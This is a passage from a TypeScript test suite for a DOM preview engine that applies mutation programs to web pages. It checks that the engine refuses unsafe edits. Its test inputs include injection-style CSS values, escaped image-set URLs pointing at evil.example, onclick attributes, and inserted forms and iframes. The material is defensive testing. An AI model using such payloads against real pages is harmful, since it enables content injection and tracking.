    { rule: "c: behavior", op: style("color", "red; behavior: x"), refused: "style-value" },
    { rule: "c: @import", op: style("color", "@import x"), refused: "style-value" },
    { rule: "c: an upper-case property", op: style("Color", "red"), refused: "style-property" },
    {
      rule: "c: a property with a colon",
      op: style("color:red;x", "1"),
      refused: "style-property",
    },
    // (d) raw-text, embedding and head elements
    {
      rule: "d: setText into a style element",
      op: { op: "setText", target: "#sheet", text: "body{display:none}" },
      refused: "text-target",
    },
    {
      rule: "d: a fragment inside noscript",
      op: { op: "insertFragment", target: "#inner", position: "append", html: "<p>x</p>" },
      refused: "text-target",
    },
    {
      rule: "d: setText on the title",
      op: { op: "setText", target: "#title", text: "Pwned" },
      refused: "text-target",
    },
  ];

  for (const c of cases) {
    test(c.rule, () => {
      page();
      const engine = createPreviewEngine(document);
      const result = engine.apply([c.op]);
      expect(result.ok).toBe(true);
      const refused = result.ok ? (result.refused ?? []) : [];
      if (c.refused === null) expect(refused).toEqual([]);
      else expect(refused).toEqual([{ index: 0, reason: c.refused as never }]);
    });
  }

  test("a: a refused URL refuses its op and leaves the page alone; the rest still lands", () => {
    const box = page();
    const engine = createPreviewEngine(document);
    const result = engine.apply([
      frag(`<img src="https://evil.example/x.png">`),
      { op: "setText", target: "#box", text: "Still applied" },
    ]);
    expect(result).toEqual({
      ok: true,
      token: expect.any(Number),
      applied: 1,
      refused: [{ index: 0, reason: "url-origin" }],
    });
    expect(box.querySelector("img")).toBeNull();
    expect(box.textContent).toBe("Still applied");
  });

  test("b: inserted and redirected links carry noopener, noreferrer and no-referrer; restore takes it off", () => {
    page();
    const engine = createPreviewEngine(document);
    engine.apply([
      frag(`<a href="https://anywhere.example/" rel="opener">go</a>`),
      { op: "setAttr", target: "#link", name: "href", value: "https://other.example/" },
    ]);
    const inserted = document.querySelector("#box a");
    expect(inserted?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(inserted?.getAttribute("referrerpolicy")).toBe("no-referrer");
    const link = document.querySelector("#link");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(link?.getAttribute("referrerpolicy")).toBe("no-referrer");
    engine.restore();
    expect(link?.hasAttribute("rel")).toBe(false);
    expect(link?.hasAttribute("referrerpolicy")).toBe(false);
  });

  test("d: on* is refused as an attribute the engine never sets (the allowlist answers first)", () => {
    page();
    const engine = createPreviewEngine(document);
    expect(
      engine.apply([{ op: "setAttr", target: "#link", name: "onclick", value: "x()" }]),
    ).toMatchObject({ ok: true, applied: 0, refused: [{ index: 0, reason: "attr-rejected" }] });
  });

  test("e: forms, fields and embeds are never inserted; an inserted button is inert", () => {
    const box = page();
    const engine = createPreviewEngine(document);
    engine.apply([
      frag(
        `<form action="/x"><input name="q"><select></select><textarea></textarea></form><iframe src="/"></iframe><button type="submit">Go</button>`,
      ),
    ]);
    expect(box.querySelector("form, input, select, textarea, iframe")).toBeNull();
    expect(box.querySelector("button")?.getAttribute("type")).toBe("button");
  });

  test("the detached renderer applies the same policy to its own document", () => {
    const doc = new DOMParser().parseFromString(
      `<body><div id="root"><p>hi</p></div></body>`,
      "text/html",
    );
    const root = doc.querySelector("#root") as Element;
    const result = applyProgramToRoot(root, [
      {
        op: "insertFragment",
        target: ":scope",
        position: "append",
        html: `<img src="https://evil.example/x.png">`,
      },
      {
        op: "setStyle",
        target: "p",
        props: [{ prop: "background", value: "url(https://evil.example/)" }],
      },
      { op: "setText", target: "p", text: "ok" },
    ]);
    expect(result).toMatchObject({ applied: 1, misses: 0, rejected: 2 });
    expect(root.querySelector("img")).toBeNull();
  });
});

describe("invariants on every mutation (R2-C6)", () => {
  function page(): void {
    document.body.innerHTML = `<form id="f"><button id="b" type="button">Go</button></form>
      <a id="l" href="/x" ping="https://track.example/p">x</a>
      <img id="cdn" src="https://cdn.example/a.png" srcset="https://cdn2.example/a.png 2x">
      <div id="box">Box</div>`;
  }
  const apply = (program: MutationProgram) => createPreviewEngine(document).apply(program);

  test("a program can never set or remove a button's type", () => {
    page();
    for (const value of ["submit", null]) {
      const r = apply([{ op: "setAttr", target: "#b", name: "type", value }]);
      expect(r).toMatchObject({
        ok: true,
        applied: 0,
        refused: [{ index: 0, reason: "attr-denied" }],
      });
      expect(document.getElementById("b")?.getAttribute("type")).toBe("button");
    }
  });

  test("an inserted button stays inert even when a later op tries to make it submit", () => {
    page();
    const r = apply([
      {
        op: "insertFragment",
        target: "#box",
        position: "append",
        html: `<button class="n">New</button>`,
      },
      { op: "setAttr", target: "button.n", name: "type", value: "submit" },
    ]);
    expect(r).toMatchObject({
      ok: true,
      applied: 1,
      refused: [{ index: 1, reason: "attr-denied" }],
    });
    expect(document.querySelector("button.n")?.getAttribute("type")).toBe("button");
  });

  test("rel, referrerpolicy and ping on links are the engine's: refused, and an href change drops ping", () => {
    page();
    for (const name of ["rel", "referrerpolicy", "ping"]) {
      const r = apply([{ op: "setAttr", target: "#l", name, value: "opener" }]);
      expect(r).toMatchObject({
        ok: true,
        applied: 0,
        refused: [{ index: 0, reason: "attr-denied" }],
      });
    }
    const engine = createPreviewEngine(document);
    engine.apply([
      { op: "setAttr", target: "#l", name: "href", value: "https://elsewhere.example/" },
    ]);
    const link = document.getElementById("l");
    expect(link?.hasAttribute("ping")).toBe(false);
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    engine.restore();
    expect(link?.getAttribute("ping")).toBe("https://track.example/p");
  });

  test("removing a link's href removes its ping too, and restore brings both back (R3-C11)", () => {
    page();
    const engine = createPreviewEngine(document);
    const r = engine.apply([{ op: "setAttr", target: "#l", name: "href", value: null }]);
    expect(r).toMatchObject({ ok: true, applied: 1 });
    const link = document.getElementById("l");
    expect(link?.hasAttribute("href")).toBe(false);
    expect(link?.hasAttribute("ping")).toBe(false);
    engine.restore();
    expect(link?.getAttribute("href")).toBe("/x");
    expect(link?.getAttribute("ping")).toBe("https://track.example/p");
  });

  test("an escaped image-set is decoded before it is checked", () => {
    page();
    const r = apply([
      {
        op: "setStyle",
        target: "#box",
        props: [
          { prop: "background-image", value: `\\69 mage-set("https://evil.example/a.png" 1x)` },
        ],
      },
    ]);
    expect(r).toMatchObject({
      ok: true,
      applied: 0,
      refused: [{ index: 0, reason: "style-value" }],
    });
  });

  test("only what the page actually loads counts as its origins, not every srcset candidate", () => {
    page();
    const ok = apply([
      {
        op: "setStyle",
        target: "#box",
        props: [{ prop: "background-image", value: "url(https://cdn.example/b.png)" }],
      },
    ]);
    expect(ok).toMatchObject({ ok: true, applied: 1 });
    const no = apply([
      {
        op: "setStyle",
        target: "#box",
        props: [{ prop: "background-image", value: "url(https://cdn2.example/b.png)" }],
      },
    ]);
    expect(no).toMatchObject({
      ok: true,
      applied: 0,
      refused: [{ index: 0, reason: "style-value" }],
    });
  });

  test("the result says how many ops applied", () => {
    page();
    expect(
      apply([
        { op: "setText", target: "#box", text: "A" },
        { op: "setStyle", target: "#box", props: [{ prop: "--x", value: "1" }] },
      ]),
    ).toMatchObject({ ok: true, applied: 1, refused: [{ index: 1, reason: "style-property" }] });
  });
});

describe("one step that can't be applied never takes the variant down", () => {
  function card(): HTMLElement {
    document.body.innerHTML = `<section id="card" class="card" style="padding: 4px"><h2 class="title">Title</h2><p class="copy">Copy</p></section>`;
    return document.querySelector("#card") as HTMLElement;
  }

  /** The session that found this: an empty "sink" first, then guesses at the page. */
  const sessionProgram: MutationProgram = [
    {
      op: "insertFragment",
      target: ":scope",
      position: "append",
      html: '<span class="onlay-sink"></span>',
    },
    { op: "setStyle", target: ".title", props: [{ prop: "color", value: "red" }] },
    { op: "setText", target: ".price-box", text: "Guessed" },
    { op: "setClass", target: ".copy", add: ["lead"], remove: [] },
  ];

  test("an empty fragment and a missing target are refused one by one; the rest lands", () => {
    const root = card();
    const before = root.outerHTML;
    const engine = createPreviewEngine(document);
    const r = engine.apply(sessionProgram, "#card");
    expect(r).toMatchObject({
      ok: true,
      applied: 2,
      refused: [
        { index: 0, reason: "fragment-empty" },
        { index: 2, reason: "target-missing" },
      ],
    });
    expect((root.querySelector(".title") as HTMLElement).style.color).toBe("red");
    expect(root.querySelector(".copy")?.className).toBe("copy lead");
    expect(root.querySelector(".onlay-sink")).toBeNull();
    engine.restore();
    expect(root.outerHTML).toBe(before);
  });

  test("a step aimed into what a refused insert would have added is refused too", () => {
    const root = card();
    const engine = createPreviewEngine(document);
    const r = engine.apply(
      [
        { op: "insertFragment", target: ":scope", position: "append", html: "<form>x</form>" },
        { op: "setText", target: "form", text: "never" },
        { op: "setText", target: ".copy", text: "Landed" },
      ],
      "#card",
    );
    expect(r).toMatchObject({
      ok: true,
      applied: 1,
      refused: [
        { index: 0, reason: "fragment-disallowed" },
        { index: 1, reason: "target-missing" },
      ],
    });
    expect(root.querySelector(".copy")?.textContent).toBe("Landed");
  });

  test("a bad class name, a style on a non-HTML element and a never-set attribute are refused before any write", () => {
    document.body.innerHTML = `<div id="card"><svg id="icon"></svg><p class="copy">Copy</p></div>`;
    const root = document.querySelector("#card") as HTMLElement;
    const before = root.outerHTML;
    const engine = createPreviewEngine(document);
    const r = engine.apply(
      [
        { op: "setClass", target: ".copy", add: ["two words"], remove: [] },
        { op: "setStyle", target: "#icon", props: [{ prop: "color", value: "red" }] },
        { op: "setAttr", target: ".copy", name: "style", value: "color: red" },
        { op: "setAttr", target: ".copy", name: "title", value: "Kept" },
      ],
      "#card",
    );
    expect(r).toMatchObject({
      ok: true,
      applied: 1,
      refused: [
        { index: 0, reason: "class-name" },
        { index: 1, reason: "target-kind" },
        { index: 2, reason: "attr-rejected" },
      ],
    });
    expect(root.querySelector(".copy")?.getAttribute("title")).toBe("Kept");
    engine.restore();
    expect(root.outerHTML).toBe(before);
  });

  test("cycling between partly applied variants restores exactly every time", () => {
    const root = card();
    const beforeInner = root.innerHTML;
    const engine = createPreviewEngine(document);
    const other: MutationProgram = [
      { op: "setText", target: ".title", text: "Other" },
      { op: "setStyle", target: ":scope", props: [{ prop: "padding", value: "20px" }] },
      { op: "insertFragment", target: ".missing", position: "after", html: "<p>never</p>" },
      { op: "insertFragment", target: ".copy", position: "replace", html: "<p>New copy</p>" },
    ];
    for (let i = 0; i < 3; i++) {
      expect(engine.apply(sessionProgram, "#card")).toMatchObject({ ok: true, applied: 2 });
      expect(engine.apply(other, "#card")).toMatchObject({
        ok: true,
        applied: 3,
        refused: [{ index: 2, reason: "target-missing" }],
      });
      expect(root.querySelector(".title")?.textContent).toBe("Other");
      expect(root.style.padding).toBe("20px");
    }
    engine.restore();
    expect(root.style.padding).toBe("4px");
    expect(root.innerHTML).toBe(beforeInner);
    expect(root.getAttribute("class")).toBe("card");
  });

  test("only a root that isn't on the page fails the whole program", () => {
    card();
    const engine = createPreviewEngine(document);
    expect(engine.apply(sessionProgram, "#not-here")).toEqual({
      ok: false,
      reason: "target-missing",
    });
    expect(engine.active).toBe(false);
  });

  test("the detached applier refuses the same steps with the same reasons", () => {
    const root = card();
    const r = applyProgramToRoot(root, sessionProgram);
    expect(r).toEqual({
      applied: 2,
      misses: 1,
      rejected: 1,
      refused: [
        { index: 0, reason: "fragment-empty" },
        { index: 2, reason: "target-missing" },
      ],
    });
  });
});

describe("the shared corpus: the space's rule and the engine agree", () => {
  for (const c of FRAGMENT_CASES) {
    const engine = c.engine;
    if (engine === undefined) continue;
    test(`fragment ${JSON.stringify(c.html)} → ${engine}`, () => {
      let verdict: string = "shows";
      try {
        buildFragment(c.html, document);
      } catch (err) {
        verdict = (err as { reason?: string }).reason ?? "threw";
      }
      expect(verdict).toBe(engine);
      // The space never refuses what the engine shows, and names the same reason when it refuses.
      if (c.server !== null) expect(verdict).toBe(c.server);
    });
  }
  for (const c of OP_CASES) {
    test(`${c.op.op} ${JSON.stringify(c.op).slice(0, 90)}: the engine agrees with ${c.server ?? "letting the page decide"}`, () => {
      if (c.page) document.body.innerHTML = `<main><p>Page</p></main>`;
      else document.body.innerHTML = `<div id="root">${c.on ?? ""}</div>`;
      const engine = createPreviewEngine(document);
      const r = engine.apply([c.op], c.page ? { kind: "page" } : "#root");
      expect(r.ok).toBe(true);
      const refused = r.ok ? (r.refused ?? []) : [];
      if (c.server === null) expect(refused).toEqual([]);
      else expect(refused).toEqual([{ index: 0, reason: c.server as RefusedOp["reason"] }]);
      engine.restore();
    });
  }
});

describe("nothing a program writes outlives it (audit 4, 6)", () => {
  test("a page's own longhand survives a variant that sets its shorthand and misses a step", () => {
    document.body.innerHTML = `<section id="card" style="padding-left: 11px"><p class="copy">Copy</p></section>`;
    const root = document.querySelector("#card") as HTMLElement;
    const engine = createPreviewEngine(document);
    const r = engine.apply(
      [
        { op: "setStyle", target: ":scope", props: [{ prop: "padding-left", value: "2px" }] },
        { op: "setStyle", target: ":scope", props: [{ prop: "padding", value: "30px" }] },
        { op: "setText", target: ".missing", text: "never" },
      ],
      "#card",
    );
    expect(r).toMatchObject({ ok: true, applied: 2 });
    engine.restore();
    expect(root.style.getPropertyValue("padding-left")).toBe("11px");
    expect(root.style.getPropertyValue("padding-top")).toBe("");
  });

  test("anything that throws part-way takes back every write the program made", () => {
    document.body.innerHTML = `<div id="card"><p class="a">A</p><p class="b">B</p></div>`;
    const b = document.querySelector(".b") as HTMLElement;
    Object.defineProperty(b, "textContent", {
      get: () => "B",
      set: () => {
        throw new Error("the page fought back");
      },
    });
    const engine = createPreviewEngine(document);
    const r = engine.apply(
      [
        { op: "setText", target: ".a", text: "Changed" },
        { op: "setText", target: ".b", text: "Boom" },
      ],
      "#card",
    );
    expect(r).toEqual({ ok: false, reason: "failed" });
    expect(document.querySelector(".a")?.textContent).toBe("A");
    expect(engine.active).toBe(false);
  });
});

describe("a reapply keeps the first baselines; a changed page ends the application (review)", () => {
  /** A page write no engine made: the shared observer reapplies every engine. */
  const pageTicks = () => {
    const tick =
      document.getElementById("tick") ?? document.body.appendChild(document.createElement("i"));
    tick.id = "tick";
    tick.textContent = String(Number(tick.textContent || "0") + 1);
  };

  test("stacked engines restore the exact original after a reapply", async () => {
    document.body.innerHTML = `<p id="t" style="color: blue;">Hello</p>`;
    const t = document.getElementById("t") as HTMLElement;
    const lower = createPreviewEngine(document);
    const upper = createPreviewEngine(document);
    lower.apply([{ op: "setStyle", target: "#t", props: [{ prop: "color", value: "red" }] }]);
    const top = upper.apply([
      { op: "setStyle", target: "#t", props: [{ prop: "color", value: "green" }] },
    ]);
    pageTicks();
    lower.reapply();
    expect(t.style.getPropertyValue("color")).toBe("green");
    expect(upper.applied(top.ok ? top.token : 0)).toBe(true);
    upper.restore();
    lower.restore();
    expect(t.getAttribute("style")).toBe("color: blue;");
  });

  test("setText and an appended fragment on one block restore its own children after a reapply", async () => {
    document.body.innerHTML = `<p id="t">Original <b>bold</b></p>`;
    const t = document.getElementById("t") as HTMLElement;
    const bold = t.querySelector("b");
    const engine = createPreviewEngine(document);
    engine.apply([
      { op: "setText", target: "#t", text: "Preview" },
      { op: "insertFragment", target: "#t", position: "append", html: "<i>more</i>" },
    ]);
    pageTicks();
    engine.reapply();
    expect(t.textContent).toBe("Previewmore");
    engine.restore();
    expect(t.innerHTML).toBe("Original <b>bold</b>");
    expect(t.querySelector("b")).toBe(bold);
  });

  test("a replace whose target no longer matches after a re-render leaves the original shown", async () => {
    document.body.innerHTML = `<div id="card"><p class="t" id="orig">Original</p></div>`;
    const orig = document.getElementById("orig") as HTMLElement;
    let ended = 0;
    const engine = createPreviewEngine(document, { onEnded: () => (ended += 1) });
    const r = engine.apply(
      [{ op: "insertFragment", target: ".t", position: "replace", html: "<p class='new'>New</p>" }],
      "#card",
    );
    expect(r).toMatchObject({ ok: true, applied: 1 });
    expect(orig.style.display).toBe("none");
    // The page re-renders: the block no longer answers to the step's selector.
    orig.classList.remove("t");
    engine.reapply();
    expect(orig.getAttribute("style")).toBeNull();
    expect(document.querySelector(".new")).toBeNull();
    expect(engine.active).toBe(false);
    expect(ended).toBe(1);
  });

  test("a page that ticks without changing which steps land keeps the preview", async () => {
    document.body.innerHTML = `<p id="t">Original</p>`;
    let ended = 0;
    const engine = createPreviewEngine(document, { onEnded: () => (ended += 1) });
    const r = engine.apply([{ op: "setText", target: "#t", text: "Preview" }]);
    for (let i = 0; i < 3; i += 1) {
      pageTicks();
      engine.reapply();
    }
    expect(document.getElementById("t")?.textContent).toBe("Preview");
    expect(engine.applied(r.ok ? r.token : 0)).toBe(true);
    expect(ended).toBe(0);
  });

  test("a lower engine that ends takes the ones above off too; they go back on over the page as it is", async () => {
    document.body.innerHTML = `<p id="t" style="color: blue;">Hello</p><p class="gone">Bye</p>`;
    const t = document.getElementById("t") as HTMLElement;
    const lower = createPreviewEngine(document);
    const upper = createPreviewEngine(document);
    lower.apply([
      { op: "setStyle", target: "#t", props: [{ prop: "color", value: "red" }] },
      { op: "setText", target: ".gone", text: "Changed" },
    ]);
    const top = upper.apply([
      { op: "setStyle", target: "#t", props: [{ prop: "color", value: "green" }] },
    ]);
    document.querySelector(".gone")?.remove();
    lower.reapply();
    expect(lower.active).toBe(false);
    expect(t.style.getPropertyValue("color")).toBe("green");
    expect(upper.applied(top.ok ? top.token : 0)).toBe(true);
    upper.restore();
    expect(t.getAttribute("style")).toBe("color: blue;");
  });

  test("a style write the page made during the preview stays after a reapply and restore", async () => {
    document.body.innerHTML = `<p id="t" style="color: blue;">Hello</p>`;
    const t = document.getElementById("t") as HTMLElement;
    const engine = createPreviewEngine(document);
    engine.apply([{ op: "setStyle", target: "#t", props: [{ prop: "color", value: "red" }] }]);
    t.style.letterSpacing = "2px";
    engine.reapply();
    expect(t.style.getPropertyValue("color")).toBe("red");
    engine.restore();
    expect(t.style.getPropertyValue("color")).toBe("blue");
    expect(t.style.letterSpacing).toBe("2px");
  });

  test("off the page it was applied on, setText and an appended fragment give the block back its children", async () => {
    document.body.innerHTML = `<p id="t">Original <b>bold</b></p>`;
    const t = document.getElementById("t") as HTMLElement;
    let page = "https://app.test/a";
    const engine = createPreviewEngine(document, { pageKey: () => page });
    engine.apply([
      { op: "setText", target: "#t", text: "Preview" },
      { op: "insertFragment", target: "#t", position: "append", html: "<i>more</i>" },
    ]);
    page = "https://app.test/b";
    pageTicks();
    engine.reapply();
    expect(t.innerHTML).toBe("Original <b>bold</b>");
  });
});
